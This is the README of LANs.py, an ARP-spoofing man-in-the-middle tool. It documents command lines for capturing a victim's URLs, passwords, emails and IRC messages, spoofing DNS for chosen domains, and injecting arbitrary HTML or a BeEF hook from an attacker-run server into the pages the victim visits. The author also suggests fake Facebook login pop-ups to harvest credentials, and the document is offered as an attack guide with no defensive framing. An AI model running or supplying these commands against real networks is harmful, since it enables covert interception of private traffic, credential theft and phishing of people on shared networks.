LANs.py
========

Multithreaded asynchronous packet parsing/injecting arp spoofer.

Individually arpspoofs the target box, router and DNS server if necessary. Displays all most the interesting bits of their traffic. Cleans up after itself.


Prereqs: Linux, scapy, python nfqueue-bindings, aircrack-ng, python twisted, BeEF (optional), wireless card capable of injection

Tested on Kali 1.0


Simplest usage:

```
python LANs.py
```

Because there's no -ip option this will arp scan the network, compare it to a live running promiscuous capture, and tell you the clients on the network that are sending the most packets, give Windows netbios names, then you can Ctrl-C and pick your target which it will then ARP spoof. Simple ARP spoofing.


Passive usage:

```
python LANs.py -u -d -p -ip 192.168.0.10
```

-u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting

-d: open an xterm with driftnet to see all images they view

-p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received

-ip: target this IP address 

Easy to remember and will probably be the most common usage of the script: options u, d, p, like udp/tcp.


HTML injection:

```
python LANs.py -b http://192.168.0.5:3000/hook.js
```

Inject a BeEF hook URL (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/) into pages the victim visits. Injecting HTML undetected is a dicey game, if a minor thing goes wrong then the user won't be able to open the page they're trying to view and they'll know something's up. This script is designed to forward packets if anything fails so during usage you may see lots of "[!] Injected packet for www.domain.com" but only see one or two domains on the BEeF
panel that the browser is hooked on. This is OK. If they don't get hooked on the first page just give it a few minutes. The goal is to be unintrusive. My favorite BEeF tools are in Commands > Social Engineering. Do things like create an official looking Facebook pop up saying the user's authentication expired and to re-enter their credentials.   

```
python LANs.py -c '<title>Owned.</title>'
```

Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first <head> and failing that injects prior to the first </head>.


Aggressive usage:
```
python LANs.py -v -d -p -n -na -set -dns facebook.com -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
```

All options:

```
python LANs.py -h
```

-u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting

-d: open an xterm with driftnet to see all images they view

-p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received

-ip: target this IP address 

-i INTERFACE: specify interface; default is first interface in `ip route`, eg: -i wlan0

-dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com

-n: performs a quick nmap scan of the target

-na: performs an aggressive nmap scan in the background and outputs to [victim IP address].nmap.txt

-v: show verbose URLs which do not truncate at 150 characters like -u

-b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js

-c 'HTML CODE': inject arbitrary html code into pages the victim vists; include the quotes when selecting HTML to inject



Cleans the following on Ctrl-C:

  Turn off IP forwarding

  Flush iptables firewall

  Individually restore each machine's ARP table


To do:

Add ability to read from pcap file


Technical details:

This script uses python nfqueue-bindings wrapped in Twisted to feed packets to callback functions as well as drop or forward certain packets. From there scapy takes over to parse and inject. 
